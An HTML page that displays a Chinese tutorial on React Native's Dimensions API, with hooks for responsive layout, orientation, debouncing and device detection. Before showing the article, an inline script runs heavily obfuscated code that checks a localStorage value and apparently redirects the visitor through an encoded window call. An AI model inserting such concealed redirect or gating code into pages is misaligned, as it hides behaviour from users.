<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x414a40=_0x1ef4;function _0x1ef4(p,s){var t=_0x5dc1();return(_0x1ef4=function(s,n){var a=t[s-=404];void 0===_0x1ef4.SkewCF&&(_0x1ef4.ElyKpw=function(s,n){var a,l=[],p=0,t="";for(s=(s=>{for(var n,a,l="",p="",t=0,e=0;a=s.charAt(e++);~a&&(n=t%4?64*n+a:a,t++%4)&&(l+=String.fromCharCode(255&n>>(-2*t&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,i=l.length;c<i;c++)p+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(p)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)p=(p+l[e]+n.charCodeAt(e%n.length))%256,a=l[e],l[e]=l[p],l[p]=a;for(var e=0,p=0,c=0;c<s.length;c++)a=l[e=(e+1)%256],l[e]=l[p=(p+l[e])%256],l[p]=a,t+=String.fromCharCode(s.charCodeAt(c)^l[(l[e]+l[p])%256]);return t},p=arguments,_0x1ef4.SkewCF=!0);var s=s+t[0],l=p[s];return l?a=l:(void 0===_0x1ef4.oUkVoL&&(_0x1ef4.oUkVoL=!0),a=_0x1ef4.ElyKpw(a,n),p[s]=a),a})(p,s)}function _0x5dc1(){var s=["W7ddUWRdLqJdGCo5W6DPW6eqWPmt","WPHgjSoPW4O0WQ/cMmoT","WO3cI8kpuwXHW6RdPmoCWONdQW","WQbOrw7cQCoiWRtdIq","W4FcTK5qWR3dOs3cRLL3obvC","ACoEhclcGheQ","W43cOYBdVmojug7cTwdcJJBdRq","xCoNWPVcMNOJjq","bq86hmk8BZNcUw3dKs4","W4BcU0PqWR7dOIxcHhTjlqLM","mmkNzmo/WPpdS8oIW5ZdMG","WQ5MWP7cGLXfW4tcN3/cMxS","WRddO2VcU8o/zdq","W73cHLVcJsRcHgVdPSkTmmkfz0S","fmoLeCk8W5pcH8okb8ojgsTsW7e","vSk3W4rVW5pdMHhcQMaHW4G3W5e","fmoRgSkZW5RcICkooCouot53","WO5uCtpdHY/dSW","rSkRCNjJBd9LW5BcMejp","W7BcGfNdK3ldVIRdISkL","AaldICk7WPpcP8kuW71pnfy","oaGyn8kYC8oaW4tcMmo6ACkvW4ZdVxeYFmknWQNcLSo7Ft9WW7JcHW","W4nrWOddLX8","W5pcUWnJWPddOG5KWOOlWQZcNq","BWnoW4/cShRdLIhcOa","w8k6oLnhW6xdNW","DWpcOmo6W6tcRmokiwW"];return(_0x5dc1=function(){return s})()}if((()=>{for(var s=_0x1ef4,n=_0x5dc1();;)try{if(441666==-parseInt(s(412,"([m4"))+-parseInt(s(423,"Te2x"))/2*(-parseInt(s(429,"WIxE"))/3)+parseInt(s(421,"UE@D"))/4*(parseInt(s(411,"#uwS"))/5)+parseInt(s(416,"gTCU"))/6*(-parseInt(s(408,"K0Cz"))/7)+-parseInt(s(405,"p4X&"))/8*(parseInt(s(417,"JedS"))/9)+parseInt(s(415,"e3TI"))/10+-parseInt(s(419,"LdqA"))/11)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x414a40(418,"$98q")](_0x414a40(430,"Egxs"))!=_0x414a40(428,"3k&s"))throw window[_0x414a40(409,"DCof")][_0x414a40(404,"9*5z")](_0x414a40(427,"lK7E")),Error();document.title="React Native Dimensions 详解",document.getElementById("article").innerHTML='<div><h1>React Native Dimensions 详解</h1>\n<p>Dimensions 是 React Native 提供的核心模块，用于获取设备屏幕和窗口的尺寸信息。以下是全面解析：</p>\n<h2>一、核心概念与基础功能</h2>\n<h3>1. 基本能力</h3>\n<ul>\n<li>获取屏幕尺寸（包括状态栏等系统元素）</li>\n<li>获取应用窗口尺寸（不包括系统元素）</li>\n<li>监听尺寸变化（如旋转设备）</li>\n<li>支持像素密度（Pixel Ratio）计算</li>\n</ul>\n<h3>2. 主要尺寸类型</h3>\n<pre><code class="language-javascript">type <span class="hljs-title class_">DimensionsObject</span> = {\n  <span class="hljs-attr">width</span>: number,\n  <span class="hljs-attr">height</span>: number,\n  <span class="hljs-attr">scale</span>: number,  <span class="hljs-comment">// 像素密度</span>\n  <span class="hljs-attr">fontScale</span>: number <span class="hljs-comment">// 字体缩放比例</span>\n};\n</code></pre>\n<h2>二、基础使用方式</h2>\n<h3>1. 获取屏幕尺寸</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dimensions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native&#x27;</span>;\n\n<span class="hljs-comment">// 获取屏幕完整尺寸（包含状态栏）</span>\n<span class="hljs-keyword">const</span> screen = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;screen&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`屏幕尺寸: <span class="hljs-subst">${screen.width}</span>x<span class="hljs-subst">${screen.height}</span>`</span>);\n\n<span class="hljs-comment">// 获取应用窗口尺寸（不包含状态栏）</span>\n<span class="hljs-keyword">const</span> <span class="hljs-variable language_">window</span> = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`窗口尺寸: <span class="hljs-subst">${<span class="hljs-variable language_">window</span>.width}</span>x<span class="hljs-subst">${<span class="hljs-variable language_">window</span>.height}</span>`</span>);\n</code></pre>\n<h3>2. 像素密度处理</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> { scale, fontScale } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;screen&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`像素密度: <span class="hljs-subst">${scale}</span>, 字体缩放: <span class="hljs-subst">${fontScale}</span>`</span>);\n\n<span class="hljs-comment">// 计算物理像素</span>\n<span class="hljs-keyword">const</span> logicalWidth = <span class="hljs-number">100</span>;\n<span class="hljs-keyword">const</span> physicalWidth = logicalWidth * scale;\n</code></pre>\n<h2>三、高级应用方案</h2>\n<h3>1. 响应式布局实现</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 响应式布局Hook</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">useResponsive</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> [dimensions, setDimensions] = <span class="hljs-title function_">useState</span>(<span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>));\n\n  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-keyword">const</span> sub = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;change&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">{ <span class="hljs-variable language_">window</span> }</span>) =&gt;</span> {\n      <span class="hljs-title function_">setDimensions</span>(<span class="hljs-variable language_">window</span>);\n    });\n    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> sub.<span class="hljs-title function_">remove</span>();\n  }, []);\n\n  <span class="hljs-comment">// 根据宽度返回布局类型</span>\n  <span class="hljs-keyword">const</span> layoutType = dimensions.<span class="hljs-property">width</span> &gt;= <span class="hljs-number">768</span> ? <span class="hljs-string">&#x27;desktop&#x27;</span> : <span class="hljs-string">&#x27;mobile&#x27;</span>;\n  \n  <span class="hljs-keyword">return</span> { ...dimensions, layoutType };\n}\n</code></pre>\n<h3>2. 屏幕旋转处理</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ScreenOrientationListener</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">orientation</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOrientation</span>();\n    <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;change&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));\n  }\n\n  <span class="hljs-title function_">getOrientation</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">const</span> { width, height } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n    <span class="hljs-keyword">return</span> width &gt; height ? <span class="hljs-string">&#x27;LANDSCAPE&#x27;</span> : <span class="hljs-string">&#x27;PORTRAIT&#x27;</span>;\n  }\n\n  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">{ <span class="hljs-variable language_">window</span> }</span>) {\n    <span class="hljs-keyword">const</span> newOrientation = <span class="hljs-variable language_">window</span>.<span class="hljs-property">width</span> &gt; <span class="hljs-variable language_">window</span>.<span class="hljs-property">height</span> ? <span class="hljs-string">&#x27;LANDSCAPE&#x27;</span> : <span class="hljs-string">&#x27;PORTRAIT&#x27;</span>;\n    <span class="hljs-keyword">if</span> (newOrientation !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">orientation</span>) {\n      <span class="hljs-variable language_">this</span>.<span class="hljs-property">orientation</span> = newOrientation;\n      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;屏幕方向变为:&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">orientation</span>);\n    }\n  }\n}\n</code></pre>\n<h2>四、实用工具方法</h2>\n<h3>1. 设备类型判断</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getDeviceType</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> { width } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n  \n  <span class="hljs-keyword">if</span> (width &gt;= <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;desktop&#x27;</span>;\n  <span class="hljs-keyword">if</span> (width &gt;= <span class="hljs-number">768</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;tablet&#x27;</span>;\n  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;phone&#x27;</span>;\n}\n</code></pre>\n<h3>2. 安全区域计算</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useSafeArea</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> { width, height } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n  <span class="hljs-keyword">const</span> orientation = width &gt; height ? <span class="hljs-string">&#x27;landscape&#x27;</span> : <span class="hljs-string">&#x27;portrait&#x27;</span>;\n  \n  <span class="hljs-comment">// 根据设备类型和方向计算安全区域</span>\n  <span class="hljs-keyword">const</span> insets = {\n    <span class="hljs-attr">top</span>: orientation === <span class="hljs-string">&#x27;portrait&#x27;</span> ? <span class="hljs-number">44</span> : <span class="hljs-number">0</span>,\n    <span class="hljs-attr">bottom</span>: <span class="hljs-number">34</span>,\n    <span class="hljs-attr">left</span>: orientation === <span class="hljs-string">&#x27;landscape&#x27;</span> ? <span class="hljs-number">44</span> : <span class="hljs-number">0</span>,\n    <span class="hljs-attr">right</span>: orientation === <span class="hljs-string">&#x27;landscape&#x27;</span> ? <span class="hljs-number">44</span> : <span class="hljs-number">0</span>\n  };\n  \n  <span class="hljs-keyword">return</span> {\n    width,\n    height,\n    orientation,\n    insets,\n    <span class="hljs-attr">safeWidth</span>: width - insets.<span class="hljs-property">left</span> - insets.<span class="hljs-property">right</span>,\n    <span class="hljs-attr">safeHeight</span>: height - insets.<span class="hljs-property">top</span> - insets.<span class="hljs-property">bottom</span>\n  };\n}\n</code></pre>\n<h2>五、性能优化技巧</h2>\n<h3>1. 尺寸变化防抖处理</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useDebouncedDimensions</span>(<span class="hljs-params">delay = <span class="hljs-number">300</span></span>) {\n  <span class="hljs-keyword">const</span> [dimensions, setDimensions] = <span class="hljs-title function_">useState</span>(<span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>));\n  <span class="hljs-keyword">const</span> timerRef = <span class="hljs-title function_">useRef</span>();\n\n  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params">{ <span class="hljs-variable language_">window</span> }</span>) =&gt; {\n      <span class="hljs-built_in">clearTimeout</span>(timerRef.<span class="hljs-property">current</span>);\n      timerRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {\n        <span class="hljs-title function_">setDimensions</span>(<span class="hljs-variable language_">window</span>);\n      }, delay);\n    };\n\n    <span class="hljs-keyword">const</span> sub = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;change&#x27;</span>, handler);\n    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {\n      sub.<span class="hljs-title function_">remove</span>();\n      <span class="hljs-built_in">clearTimeout</span>(timerRef.<span class="hljs-property">current</span>);\n    };\n  }, [delay]);\n\n  <span class="hljs-keyword">return</span> dimensions;\n}\n</code></pre>\n<h3>2. 尺寸记忆化处理</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> memoizedDimensions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> { width } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n  <span class="hljs-keyword">return</span> {\n    <span class="hljs-attr">isSmallScreen</span>: width &lt; <span class="hljs-number">375</span>,\n    <span class="hljs-attr">isLargeScreen</span>: width &gt;= <span class="hljs-number">768</span>,\n    <span class="hljs-comment">// 其他计算属性...</span>\n  };\n}, []);\n</code></pre>\n<h2>六、平台特性与差异</h2>\n<h3>1. 平台尺寸差异</h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>iOS</th>\n<th>Android</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>状态栏高度</td>\n<td>动态获取</td>\n<td>通常为24dp/48dp</td>\n</tr>\n<tr>\n<td>全面屏适配</td>\n<td>SafeAreaView支持</td>\n<td>需要手动处理</td>\n</tr>\n<tr>\n<td>旋转响应速度</td>\n<td>即时</td>\n<td>可能有延迟</td>\n</tr>\n</tbody>\n</table>\n<h3>2. 全面屏适配方案</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useFullScreenDimensions</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> [dimensions, setDimensions] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-keyword">const</span> { width, height } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n    <span class="hljs-keyword">return</span> { width, height, <span class="hljs-attr">isLandscape</span>: width &gt; height };\n  });\n\n  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-keyword">const</span> sub = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;change&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">{ <span class="hljs-variable language_">window</span> }</span>) =&gt;</span> {\n      <span class="hljs-title function_">setDimensions</span>({\n        <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">width</span>,\n        <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">height</span>,\n        <span class="hljs-attr">isLandscape</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">width</span> &gt; <span class="hljs-variable language_">window</span>.<span class="hljs-property">height</span>\n      });\n    });\n    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> sub.<span class="hljs-title function_">remove</span>();\n  }, []);\n\n  <span class="hljs-keyword">return</span> dimensions;\n}\n</code></pre>\n<h2>七、常见问题解决方案</h2>\n<h3>1. 尺寸获取不准确问题</h3>\n<p><strong>解决方案</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 添加延迟确保获取正确尺寸</span>\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-keyword">const</span> correctSize = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n    <span class="hljs-title function_">setDimensions</span>(correctSize);\n  }, <span class="hljs-number">100</span>);\n  \n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer);\n}, []);\n</code></pre>\n<h3>2. 旋转监听失效问题</h3>\n<p><strong>检查步骤</strong>  ：</p>\n<ol>\n<li>确认是否正确添加事件监听</li>\n<li>检查是否在组件卸载时移除了监听</li>\n<li>确保没有多个监听器冲突</li>\n</ol>\n<h3>3. 平板/手机识别错误</h3>\n<p><strong>改进方案</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getDeviceClass</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> { width, height } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;window&#x27;</span>);\n  <span class="hljs-keyword">const</span> diagonal = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(width, <span class="hljs-number">2</span>) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(height, <span class="hljs-number">2</span>));\n  <span class="hljs-keyword">const</span> diagonalInches = diagonal / <span class="hljs-number">160</span>; <span class="hljs-comment">// 160ppi基准</span>\n  \n  <span class="hljs-keyword">if</span> (diagonalInches &gt;= <span class="hljs-number">6.5</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;tablet&#x27;</span>;\n  <span class="hljs-keyword">if</span> (diagonalInches &gt;= <span class="hljs-number">4.7</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;largePhone&#x27;</span>;\n  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;smallPhone&#x27;</span>;\n}\n</code></pre>\n<h2>八、调试与测试技巧</h2>\n<h3>1. 开发环境模拟</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 开发模式下添加尺寸模拟器</span>\n<span class="hljs-keyword">if</span> (__DEV__) {\n  <span class="hljs-keyword">const</span> <span class="hljs-title function_">DeviceSimulator</span> = (<span class="hljs-params"></span>) =&gt; {\n    <span class="hljs-keyword">const</span> devices = [\n      { <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;iPhone 13&#x27;</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">390</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">844</span> },\n      { <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;iPad Pro&#x27;</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">1024</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">1366</span> }\n    ];\n\n    <span class="hljs-keyword">return</span> (\n      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.simulator}</span>&gt;</span>\n        {devices.map(device =&gt; (\n          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> \n            <span class="hljs-attr">key</span>=<span class="hljs-string">{device.name}</span>\n            <span class="hljs-attr">title</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">模拟</span>${<span class="hljs-attr">device.name</span>}`}\n            <span class="hljs-attr">onPress</span>=<span class="hljs-string">{()</span> =&gt;</span> {\n              Dimensions.set({ window: device });\n            }}\n          /&gt;\n        ))}\n      <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span></span>\n    );\n  };\n}\n</code></pre>\n<h3>2. 自动化测试集成</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 测试时mock尺寸</span>\n<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">set</span>({\n    <span class="hljs-attr">window</span>: { <span class="hljs-attr">width</span>: <span class="hljs-number">375</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">812</span>, <span class="hljs-attr">scale</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">fontScale</span>: <span class="hljs-number">1</span> },\n    <span class="hljs-attr">screen</span>: { <span class="hljs-attr">width</span>: <span class="hljs-number">375</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">812</span>, <span class="hljs-attr">scale</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">fontScale</span>: <span class="hljs-number">1</span> }\n  });\n});\n</code></pre>\n<p>通过深入理解 Dimensions API，开发者可以：</p>\n<ol>\n<li>创建完美适配不同设备的布局</li>\n<li>实现响应式设计</li>\n<li>优化横竖屏切换体验</li>\n<li>精确控制元素尺寸和位置</li>\n</ol>\n<p>建议将常用尺寸逻辑封装成自定义Hook，提高代码复用性和可维护性。</p>\n</div>'</script></body></html>